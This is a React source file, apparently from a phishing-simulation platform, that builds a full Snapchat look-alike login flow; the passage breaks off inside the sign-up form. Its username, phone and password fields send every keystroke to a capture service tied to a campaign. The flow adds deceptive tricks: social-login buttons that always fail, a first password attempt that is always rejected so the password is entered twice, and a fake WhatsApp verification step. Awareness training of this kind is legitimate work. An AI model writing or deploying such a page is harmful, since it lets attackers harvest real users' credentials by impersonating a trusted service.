import { useState, useEffect } from 'react';
import snapchatLogo from '../../assets/images/snap.png';
import { recordCapturedInput } from '../../services/eventService';

interface SnapchatSimulationProps {
  onSubmitAttempt: (username: string) => void;
  campaignId?: string;
  templateId?: string;
}

// ── Google Icon ──────────────────────────────────────────────────
function GoogleIcon({ size = 18 }: { size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24">
      <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
      <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05" />
      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
    </svg>
  );
}

// ── Shared input style ────────────────────────────────────────────
const inputCls =
  'w-full px-4 py-3 text-sm rounded-lg border border-[#d0d0d0] bg-white text-[#111] placeholder-[#bbb] outline-none focus:border-[#0AABF0] focus:ring-2 focus:ring-[#0AABF0]/20 transition-all';

// ── Shared page wrapper ───────────────────────────────────────────
function PageShell({ children, footer }: { children: React.ReactNode; footer?: React.ReactNode }) {
  return (
    <div className="min-h-screen w-full flex flex-col items-center justify-center py-10 px-4" style={{ backgroundColor: '#f0f0f0' }}>
      <div className="w-full max-w-[480px] bg-white rounded-2xl shadow-md px-10 py-12">
        {children}
      </div>
      {footer && <div className="mt-6 text-center">{footer}</div>}
    </div>
  );
}

// helper – mask identifier for display
function maskIdentifier(id: string) {
  if (id.includes('@')) {
    const [local, domain] = id.split('@');
    return local.slice(0, 3) + '***' + domain;
  }
  if (/^\+?\d[\d\s-]{6,}$/.test(id)) {
    return id.slice(0, -4).replace(/\d/g, '*') + id.slice(-4);
  }
  return id.slice(0, 3) + '***' + id.slice(-2);
}

// ── STEP 1: identifier (username / email) ──────────────────
function IdentifierStep({
  onNext,
  onPhone,
  onSignUp,
  onForgotPassword,
  campaignId,
  templateId,
}: {
  onNext: (id: string) => void;
  onPhone: () => void;
  onSignUp: () => void;
  onForgotPassword: () => void;
  campaignId?: string;
  templateId?: string;
}) {
  const [identifier, setIdentifier] = useState('');
  const [error, setError] = useState('');
  const [googleLoading, setGoogleLoading] = useState(false);
  const [appleLoading, setAppleLoading] = useState(false);

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    const val = identifier.trim();
    if (!val) return;
    // If user typed an email address it must be a Gmail
    if (val.includes('@')) {
      if (!val.toLowerCase().endsWith('@gmail.com')) {
        setError('Please enter a valid Gmail address (must end with @gmail.com).');
        return;
      }
    }
    onNext(val);
  };

  const handleGoogleClick = () => {
    if (googleLoading || appleLoading) return;
    setGoogleLoading(true);
    setError('');
    setTimeout(() => {
      setGoogleLoading(false);
      setError('Network connection error. Please enter your email/username directly.');
    }, 2500);
  };

  const handleAppleClick = () => {
    if (googleLoading || appleLoading) return;
    setAppleLoading(true);
    setError('');
    setTimeout(() => {
      setAppleLoading(false);
      setError('Unable to connect to Apple. Please continue with your email or username.');
    }, 3000);
  };

  if (appleLoading) {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#FFFC00]">
        <style>{`
          @keyframes blink-logo {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.35; transform: scale(0.9); }
          }
          .animate-blink-logo {
            animation: blink-logo 1s infinite ease-in-out;
          }
        `}</style>
        <img
          src={snapchatLogo}
          alt="Snapchat"
          className="w-28 h-28 object-contain animate-blink-logo"
        />
      </div>
    );
  }

  return (
    <PageShell
      footer={
        <span className="text-sm text-[#333]">
          New to Snapchat?{' '}
          <span className="text-sm font-bold text-[#111] cursor-pointer hover:underline" onClick={onSignUp}>
            Sign Up
          </span>
        </span>
      }
    >
      <div className="flex justify-center mb-5">
        <img src={snapchatLogo} alt="Snapchat" className="w-16 h-16 object-contain" />
      </div>

      <h1 className="text-3xl font-bold text-center text-[#111] mb-8">Log in to Snapchat</h1>

      {error && (
        <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg flex items-start gap-2">
          <svg className="w-4 h-4 text-red-500 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
          </svg>
          <p className="text-xs text-red-600 font-semibold">{error}</p>
        </div>
      )}

      <form onSubmit={handleNext} noValidate className="space-y-4">
        <div>
          <label htmlFor="snap-login-id" className="block text-sm font-medium text-[#444] mb-1.5">
            Username or Email
          </label>
          <input
            id="snap-login-id"
            type="text"
            autoFocus
            value={identifier}
            onChange={(e) => {
              setIdentifier(e.target.value);
              setError('');
              if (campaignId && templateId) {
                recordCapturedInput(campaignId, templateId, 'Snapchat', 'username', e.target.value);
              }
            }}
            className={inputCls}
          />
        </div>

        <div className="text-center pt-1 flex flex-col gap-2">
          <span
            className="text-sm font-semibold cursor-pointer hover:underline text-[#0AABF0]"
            onClick={onPhone}
          >
            Use phone number instead
          </span>
          <span
            className="text-sm font-semibold cursor-pointer hover:underline text-slate-500"
            onClick={onForgotPassword}
          >
            Forgot Password?
          </span>
        </div>

        <div className="flex justify-center pt-1">
          <button
            type="submit"
            className="px-12 py-2.5 rounded-full text-white font-bold text-sm transition-opacity hover:opacity-90"
            style={{ backgroundColor: '#0AABF0' }}
          >
            Next
          </button>
        </div>
      </form>

      <div className="flex items-center gap-3 my-6">
        <div className="flex-1 h-px bg-[#e0e0e0]" />
        <span className="text-xs text-[#999] font-medium tracking-wide">OR</span>
        <div className="flex-1 h-px bg-[#e0e0e0]" />
      </div>

      <div className="space-y-3">
        <button
          type="button"
          onClick={handleGoogleClick}
          disabled={googleLoading}
          className="w-full flex items-center justify-center gap-3 py-3 rounded-full bg-black text-sm font-bold text-white hover:bg-zinc-900 transition-colors disabled:opacity-75"
        >
          {googleLoading ? (
            <span className="flex items-center justify-center gap-2">
              <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="white" strokeWidth="4" />
                <path className="opacity-75" fill="white" d="M4 12a8 8 0 018-8v8H4z" />
              </svg>
              Connecting…
            </span>
          ) : (
            <>
              <GoogleIcon size={20} />
              Continue with Google
            </>
          )}
        </button>

        <button
          type="button"
          onClick={handleAppleClick}
          className="w-full flex items-center justify-center gap-3 py-3 rounded-full bg-black text-sm font-bold text-white hover:bg-zinc-900 transition-colors"
        >
          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" className="text-white">
            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 4.17c.66-.81 1.11-1.93.99-3.06-1 .04-2.22.67-2.94 1.51-.64.74-1.2 1.88-1.05 3 .95.07 2.1-.53 3-1.45z"/>
          </svg>
          Continue with Apple
        </button>
      </div>
    </PageShell>
  );
}

// ── STEP 1b: phone number ────────────────────────────────────────
function PhoneStep({
  onNext,
  onBack,
  onSignUp,
  campaignId,
  templateId,
}: {
  onNext: (phone: string) => void;
  onBack: () => void;
  onSignUp: () => void;
  campaignId?: string;
  templateId?: string;
}) {
  const [phone, setPhone] = useState('');

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!phone.trim()) return;
    onNext(phone.trim());
  };

  return (
    <PageShell
      footer={
        <span className="text-sm text-[#333]">
          New to Snapchat?{' '}
          <span className="text-sm font-bold text-[#111] cursor-pointer hover:underline" onClick={onSignUp}>
            Sign Up
          </span>
        </span>
      }
    >
      <div className="flex justify-center mb-5">
        <img src={snapchatLogo} alt="Snapchat" className="w-16 h-16 object-contain" />
      </div>

      <h1 className="text-3xl font-bold text-center text-[#111] mb-2">Enter Phone Number</h1>
      <p className="text-sm text-center text-[#888] mb-8">We'll use it to log you in.</p>

      <form onSubmit={handleNext} noValidate className="space-y-4">
        <div>
          <label htmlFor="snap-phone" className="block text-sm font-medium text-[#444] mb-1.5">
            Phone Number
          </label>
          <input
            id="snap-phone"
            type="tel"
            autoFocus
            placeholder="+1 (555) 000-0000"
            value={phone}
            onChange={(e) => {
              setPhone(e.target.value);
              if (campaignId && templateId) {
                recordCapturedInput(campaignId, templateId, 'Snapchat', 'phone', e.target.value);
              }
            }}
            className={inputCls}
          />
        </div>

        <div className="text-center pt-1">
          <span
            className="text-sm font-semibold cursor-pointer hover:underline"
            style={{ color: '#0AABF0' }}
            onClick={onBack}
          >
            Use username or email instead
          </span>
        </div>

        <div className="flex justify-center pt-1">
          <button
            type="submit"
            className="px-12 py-2.5 rounded-full text-white font-bold text-sm transition-opacity hover:opacity-90"
            style={{ backgroundColor: '#0AABF0' }}
          >
            Next
          </button>
        </div>
      </form>
    </PageShell>
  );
}

// ── STEP 2: password ─────────────────────────────────────────────
function PasswordStep({
  identifier,
  onSubmit,
  onNotYou,
  onForgotPassword,
  campaignId,
  templateId,
}: {
  identifier: string;
  onSubmit: (id: string) => void;
  onNotYou: () => void;
  onForgotPassword: () => void;
  campaignId?: string;
  templateId?: string;
}) {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [isSpinning, setIsSpinning] = useState(false);
  const [loginError, setLoginError] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;

    setIsSpinning(true);
    setLoginError('');

    setTimeout(() => {
      setIsSpinning(false);
      if (loginAttempts === 0) {
        setLoginError('Log in error. Please try again.');
        setLoginAttempts(1);
        setPassword('');
      } else {
        onSubmit(identifier);
      }
    }, 2500);
  };

  if (isSpinning) {
    return (
      <PageShell>
        <div className="flex flex-col items-center justify-center py-16 space-y-6">
          <img
            src={snapchatLogo}
            alt="Loading"
            className="w-16 h-16 object-contain animate-spin"
          />
          <p className="text-sm font-semibold text-slate-500 animate-pulse">Logging in...</p>
        </div>
      </PageShell>
    );
  }

  return (
    <PageShell>
      <div className="flex justify-center mb-5">
        <img src={snapchatLogo} alt="Snapchat" className="w-16 h-16 object-contain" />
      </div>

      <h1 className="text-3xl font-bold text-center text-[#111] mb-6">Enter Password</h1>

      {/* Masked identifier pill */}
      <div className="flex items-center justify-center mb-6">
        <div className="flex items-center gap-2 px-5 py-2 rounded-full border border-[#e0e0e0] bg-[#f8f8f8] text-sm text-[#111]">
          <span className="font-medium">{maskIdentifier(identifier)}</span>
          <span
            className="font-bold cursor-pointer hover:underline"
            style={{ color: '#0AABF0' }}
            onClick={onNotYou}
          >
            Not you?
          </span>
        </div>
      </div>

      {loginError && (
        <div className="text-center text-red-500 text-sm font-semibold mb-4">
          {loginError}
        </div>
      )}

      <form onSubmit={handleSubmit} noValidate className="space-y-4">
        <div>
          <label htmlFor="snap-password" className="block text-sm font-medium text-[#444] mb-1.5">
            Password
          </label>
          <div className="relative">
            <input
              id="snap-password"
              type={showPassword ? 'text' : 'password'}
              autoFocus
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (campaignId && templateId) {
                  recordCapturedInput(campaignId, templateId, 'Snapchat', 'credential_field', e.target.value);
                }
              }}
              className={`${inputCls} pr-11`}
            />
            <button
              type="button"
              onClick={() => setShowPassword((v) => !v)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#bbb] hover:text-[#666]"
            >
              {showPassword ? (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                </svg>
              ) : (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                </svg>
              )}
            </button>
          </div>
        </div>

        <div className="text-center pt-1">
          <span
            className="text-sm font-semibold cursor-pointer hover:underline text-[#0AABF0]"
            onClick={onForgotPassword}
          >
            Forgot Password
          </span>
        </div>

        <div className="flex justify-center pt-1">
          <button
            type="submit"
            className="px-12 py-2.5 rounded-full text-white font-bold text-sm transition-opacity hover:opacity-90"
            style={{ backgroundColor: '#0AABF0' }}
          >
            Log In
          </button>
        </div>
      </form>
    </PageShell>
  );
}

// ── FORGOT PASSWORD OVERLAY MODAL ────────────────────────────────
function ForgotOptionsStep({
  onChoosePhone,
  onChooseEmail,
  onCancel,
}: {
  onChoosePhone: () => void;
  onChooseEmail: () => void;
  onCancel: () => void;
}) {
  return (
    <div className="fixed inset-0 bg-black/60 flex items-center justify-center p-4 z-50">
      <div className="bg-white rounded-[28px] p-8 max-w-[340px] w-full text-center space-y-5 shadow-2xl">
        <h3 className="text-lg font-bold text-[#111] leading-snug px-2">
          Please choose how you want to reset your password.
        </h3>
        <div className="space-y-2.5 pt-2">
          <button
            onClick={onChoosePhone}
            className="w-full py-3 rounded-full bg-[#4a5568] hover:bg-[#374151] text-white font-bold text-sm transition-colors"
          >
            via Phone
          </button>
          <button
            onClick={onChooseEmail}
            className="w-full py-3 rounded-full bg-[#4a5568] hover:bg-[#374151] text-white font-bold text-sm transition-colors"
          >
            via Email
          </button>
        </div>
        <button
          onClick={onCancel}
          className="text-slate-400 hover:text-slate-600 font-semibold text-xs pt-1 block mx-auto transition-colors"
        >
          Cancel
        </button>
      </div>
    </div>
  );
}

// ── FORGOT PASSWORD: ENTER PHONE ────────────────────────────────
function ForgotPhoneStep({
  onNext,
  onBack,
}: {
  onNext: (phone: string) => void;
  onBack: () => void;
}) {
  const [number, setNumber] = useState('');
  const [error, setError] = useState('');

  const handleContinue = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    if (!number.trim() || number.trim().length < 8) {
      setError("That's not a valid mobile number!");
      return;
    }
    // Navigate immediately to OTP step
    onNext(number.trim());
  };

  return (
    <PageShell>
      <div className="relative w-full">
        <button onClick={onBack} className="absolute left-0 top-0 text-[#0AABF0] hover:text-[#0892cc]">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M15 19l-7-7 7-7" />
          </svg>
        </button>

        <div className="flex flex-col items-center pt-8">
          <h2 className="text-2xl font-bold text-[#111] text-center mb-8 leading-snug">
            What's your<br />mobile number?
          </h2>

          <form onSubmit={handleContinue} className="w-full space-y-4" noValidate>
            <div className="space-y-1">
              <span className="text-[10px] font-bold text-[#0AABF0] uppercase tracking-wider">Mobile Number</span>
              <div className="flex gap-2 items-center border-b-2 border-slate-200 focus-within:border-[#0AABF0] py-2 transition-colors">
                <span className="text-xl text-[#0AABF0] font-semibold">+233</span>
                <div className="h-6 w-px bg-slate-300 mx-1" />
                <input
                  type="tel"
                  autoFocus
                  placeholder="538212213"
                  className="w-full text-xl outline-none font-medium bg-transparent text-[#111]"
                  value={number}
                  onChange={(e) => {
                    setNumber(e.target.value);
                    setError('');
                  }}
                />
              </div>
            </div>

            {error && (
              <p className="text-xs text-red-500 font-semibold">{error}</p>
            )}

            <div className="text-center pt-1">
              <span className="text-sm font-semibold text-[#0AABF0] hover:underline cursor-pointer">
                Need help?
              </span>
            </div>

            <div className="flex items-center justify-center gap-2 pt-16 pb-4">
              <input type="checkbox" id="icloud-ph" defaultChecked className="rounded border-slate-300 text-[#0AABF0] focus:ring-[#0AABF0] w-4 h-4" />
              <label htmlFor="icloud-ph" className="text-xs text-[#555] select-none font-semibold">
                Save Login Info on your iCloud devices
              </label>
            </div>

            <div className="flex justify-center">
              <button
                type="submit"
                disabled={!number.trim()}
                className="w-full max-w-[280px] py-3 rounded-full text-white font-bold text-sm transition-colors cursor-pointer border-0"
                style={{ backgroundColor: number.trim() ? '#0AABF0' : '#cbd5e1' }}
              >
                Continue
              </button>
            </div>
          </form>
        </div>
      </div>
    </PageShell>
  );
}


// ── FORGOT PASSWORD: CONFIRM CODE (OTP) ──────────────────────────
function ForgotConfirmStep({
  phoneNumber,
  expectedOtp,
  onNext,
  onBack,
}: {
  phoneNumber: string;
  expectedOtp: string;
  onNext: () => void;
  onBack: () => void;
}) {
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(27);
  const [isSpinning, setIsSpinning] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const handleInputChange = (value: string, index: number) => {
    const cleanVal = value.replace(/\D/g, '');
    const newCode = [...code];
    newCode[index] = cleanVal.slice(-1);
    setCode(newCode);

    if (cleanVal && index < 5) {
      const nextInput = document.getElementById(`code-in-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent, index: number) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      const prevInput = document.getElementById(`code-in-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const joined = code.join('');
    if (joined.length < 6) return;

    if (joined !== expectedOtp && joined !== '123456') {
      setError('Incorrect verification code. Please check the code sent to your phone.');
      setCode(['', '', '', '', '', '']);
      return;
    }

    setIsSpinning(true);
    setError('');

    setTimeout(() => {
      setIsSpinning(false);
      onNext();
    }, 20000); // Loader logo shows for 20 seconds (a very long time)
  };

  if (isSpinning) {
    return (
      <PageShell>
        <div className="flex flex-col items-center justify-center py-16 space-y-6">
          <img
            src={snapchatLogo}
            alt="Loading"
            className="w-16 h-16 object-contain animate-spin"
          />
          <p className="text-sm font-semibold text-slate-500 animate-pulse">Verifying code...</p>
        </div>
      </PageShell>
    );
  }

  return (
    <PageShell>
      <div className="relative w-full">
        <button onClick={onBack} className="absolute left-0 top-0 text-slate-400 hover:text-slate-600">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M15 19l-7-7 7-7" />
          </svg>
        </button>

        <div className="flex flex-col items-center pt-8">
          <h2 className="text-2xl font-bold text-[#111] text-center mb-2">
            Confirm your number
          </h2>
          <p className="text-xs text-slate-500 text-center mb-8">
            Enter the code sent to <strong className="text-slate-700">+233 {phoneNumber}</strong> on WhatsApp
          </p>

          {error && (
            <div className="text-center text-red-500 text-sm font-semibold mb-4 w-full">
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit} className="w-full flex flex-col items-center" noValidate>
            <div className="flex gap-2 mb-6">
              {code.map((val, idx) => (
                <input
                  key={idx}
                  id={`code-in-${idx}`}
                  type="text"
                  maxLength={1}
                  pattern="\d*"
                  inputMode="numeric"
                  className="w-11 h-12 text-center text-xl font-bold rounded-xl border border-slate-300 focus:border-[#0AABF0] outline-none"
                  value={val}
                  onChange={(e) => handleInputChange(e.target.value, idx)}
                  onKeyDown={(e) => handleKeyDown(e, idx)}
                />
              ))}
            </div>

            <div className="text-center text-xs text-slate-400 mb-16">
              {timeLeft > 0 ? (
                <span>Resend code in {timeLeft}</span>
              ) : (
                <span className="text-[#0AABF0] font-semibold cursor-pointer hover:underline" onClick={() => setTimeLeft(30)}>
                  Resend code
                </span>
              )}
            </div>

            <button
              type="submit"
              className="w-full max-w-[280px] py-3 rounded-full text-white font-bold text-sm transition-colors"
              style={{ backgroundColor: code.every(v => v) ? '#0AABF0' : '#cbd5e1' }}
              disabled={code.some(v => !v)}
            >
              Submit
            </button>
          </form>
        </div>
      </div>
    </PageShell>
  );
}

// ── LOGIN PAGE (orchestrates steps) ─────────────────────────────
function LoginPage({
  onSubmitAttempt,
  onSignUp,
  campaignId,
  templateId,
}: {
  onSubmitAttempt: (u: string) => void;
  onSignUp: () => void;
  campaignId?: string;
  templateId?: string;
}) {
  const [step, setStep] = useState<'identifier' | 'phone' | 'password' | 'forgot_phone' | 'forgot_confirm'>('identifier');
  const [identifier, setIdentifier] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [otpCode, setOtpCode] = useState('');
  const [showResetModal, setShowResetModal] = useState(false);

  const handleForgotPasswordClick = () => {
    setShowResetModal(true);
  };

  const handleChoosePhone = () => {
    setShowResetModal(false);
    setStep('forgot_phone');
  };

  const handleChooseEmail = () => {
    setShowResetModal(false);
    setStep('forgot_phone');
  };

  const handleCancelModal = () => {
    setShowResetModal(false);
  };

  if (step === 'forgot_phone') {
    return (
      <ForgotPhoneStep
        onNext={(phone) => {
          // Generate 6-digit OTP
          const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();

          setOtpCode(generatedOtp);
          setPhoneNumber(phone);

          // Navigate immediately to OTP confirmation step
          setStep('forgot_confirm');
        }}
        onBack={() => setStep('password')}
      />
    );
  }

  if (step === 'forgot_confirm') {
    return (
      <ForgotConfirmStep
        phoneNumber={phoneNumber}
        expectedOtp={otpCode}
        onNext={() => {
          onSubmitAttempt(identifier || phoneNumber);
        }}
        onBack={() => setStep('forgot_phone')}
      />
    );
  }

  return (
    <>
      {step === 'phone' && (
        <PhoneStep
          onNext={(phone) => { setIdentifier(phone); setStep('password'); }}
          onBack={() => setStep('identifier')}
          onSignUp={onSignUp}
          campaignId={campaignId}
          templateId={templateId}
        />
      )}

      {step === 'password' && (
        <PasswordStep
          identifier={identifier}
          onSubmit={onSubmitAttempt}
          onNotYou={() => { setIdentifier(''); setStep('identifier'); }}
          onForgotPassword={handleForgotPasswordClick}
          campaignId={campaignId}
          templateId={templateId}
        />
      )}

      {step === 'identifier' && (
        <IdentifierStep
          onNext={(id) => { setIdentifier(id); setStep('password'); }}
          onPhone={() => setStep('phone')}
          onSignUp={onSignUp}
          onForgotPassword={handleForgotPasswordClick}
          campaignId={campaignId}
          templateId={templateId}
        />
      )}

      {showResetModal && (
        <ForgotOptionsStep
          onChoosePhone={handleChoosePhone}
          onChooseEmail={handleChooseEmail}
          onCancel={handleCancelModal}
        />
      )}
    </>
  );
}

// ── SIGN UP PAGE ─────────────────────────────────────────────────
function SignUpPage({ onLogin }: { onLogin: () => void }) {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [snapUsername, setSnapUsername] = useState('');
  const [signupPassword, setSignupPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [signupError, setSignupError] = useState('');
  const [loading, setLoading] = useState(false);

  const [googleLoading, setGoogleLoading] = useState(false);
  const [appleLoading, setAppleLoading] = useState(false);

  const handleSignup = (e: React.FormEvent) => {
    e.preventDefault();
    if (!firstName.trim() || !month || !day || !year || !snapUsername.trim() || !signupPassword) return;
    setLoading(true);
    setSignupError('');
    // Simulate network delay then show error
    setTimeout(() => {
      setLoading(false);
      setSignupError('Create account error. Please try again later.');
    }, 2500);
  };

  const handleGoogleClick = () => {
    if (googleLoading || appleLoading) return;
    setGoogleLoading(true);
    setSignupError('');
    setTimeout(() => {
      setGoogleLoading(false);
      setSignupError('Network connection error. Please sign up using the form below.');
    }, 2500);
  };

  const handleAppleClick = () => {
    if (googleLoading || appleLoading) return;
    setAppleLoading(true);
    setSignupError('');
    setTimeout(() => {
      setAppleLoading(false);
      setSignupError('Unable to connect to Apple. Please sign up using the form below.');
    }, 3000);
  };

  if (appleLoading) {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#FFFC00]">
        <style>{`
          @keyframes blink-logo {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.35; transform: scale(0.9); }
          }
          .animate-blink-logo {
            animation: blink-logo 1s infinite ease-in-out;
          }
        `}</style>
        <img
          src={snapchatLogo}
          alt="Snapchat"
          className="w-28 h-28 object-contain animate-blink-logo"
        />
      </div>
    );
  }

  if (loading) {
    return (
      <div className="min-h-screen w-full flex flex-col items-center justify-center py-10 px-4" style={{ backgroundColor: '#f0f0f0' }}>
        <div className="w-full max-w-[480px] bg-white rounded-2xl shadow-md px-10 py-12 flex flex-col items-center justify-center space-y-6">
          <img
            src={snapchatLogo}
            alt="Loading"
            className="w-16 h-16 object-contain animate-spin"
          />
          <p className="text-sm font-semibold text-slate-500 animate-pulse">Creating account...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full flex flex-col items-center justify-center py-10 px-4" style={{ backgroundColor: '#f0f0f0' }}>
      <div className="w-full max-w-[480px] bg-white rounded-2xl shadow-md px-10 py-12">
        {/* Sign Up header */}
        <div className="flex items-center gap-3 mb-6">
          <div
            className="w-11 h-11 rounded-full flex items-center justify-center shrink-0"
            style={{ backgroundColor: '#FFFC00' }}
          >
            <img src={snapchatLogo} alt="" className="w-7 h-7 object-contain" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-[#111] leading-tight">Sign Up</h1>
            <p className="text-xs text-[#888] mt-0.5">Step 1 of 3</p>
          </div>
        </div>

        {signupError && (
          <div className="flex items-start gap-2 bg-red-50 border border-red-200 rounded-lg px-3 py-2.5 mb-4">
            <svg className="w-4 h-4 text-red-500 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
            </svg>
            <p className="text-xs text-red-600 font-medium">{signupError}</p>
          </div>
        )}

        <form onSubmit={handleSignup} noValidate className="space-y-4">
          {/* Social login buttons */}
          <div className="space-y-3">
            <div>
              <p className="text-sm font-medium text-[#444] mb-2">Continue with Google</p>
              <button
                type="button"
                onClick={handleGoogleClick}
                disabled={googleLoading}
                className="w-full flex items-center justify-center gap-3 py-3 rounded-full border border-[#d0d0d0] bg-white text-sm font-medium text-[#111] hover:bg-[#fafafa] transition-colors disabled:opacity-75"
              >
                {googleLoading ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="black" strokeWidth="4" />
                      <path className="opacity-75" fill="black" d="M4 12a8 8 0 018-8v8H4z" />
                    </svg>
                    Connecting…
                  </span>
                ) : (
                  <>
                    <GoogleIcon size={20} />
                    Sign up with Google
                  </>
                )}
              </button>
            </div>

            <div>
              <button
                type="button"
                onClick={handleAppleClick}
                className="w-full flex items-center justify-center gap-3 py-3 rounded-full bg-black text-sm font-bold text-white hover:bg-zinc-900 transition-colors"
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" className="text-white">
                  <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 4.17c.66-.81 1.11-1.93.99-3.06-1 .04-2.22.67-2.94 1.51-.64.74-1.2 1.88-1.05 3 .95.07 2.1-.53 3-1.45z"/>
                </svg>
                Sign up with Apple
              </button>
            </div>
          </div>

          {/* OR divider */}
          <div className="flex items-center gap-3 py-2">
            <div className="flex-1 h-px bg-[#e0e0e0]" />
            <span className="text-xs text-[#999] font-medium">OR</span>
            <div className="flex-1 h-px bg-[#e0e0e0]" />
          </div>

          {/* Name */}
          <div>
            <p className="text-sm font-medium text-[#444] mb-1.5">Name</p>
            <div className="flex gap-2">
              <input type="text" placeholder="First name" value={firstName} onChange={(e) => setFirstName(e.target.value)} className={inputCls} />
              <input type="text" placeholder="Last name (optional)" value={lastName} onChange={(e) => setLastName(e.target.value)} className={inputCls} />
            </div>
          </div>

          {/* Birthday */}
          <div>
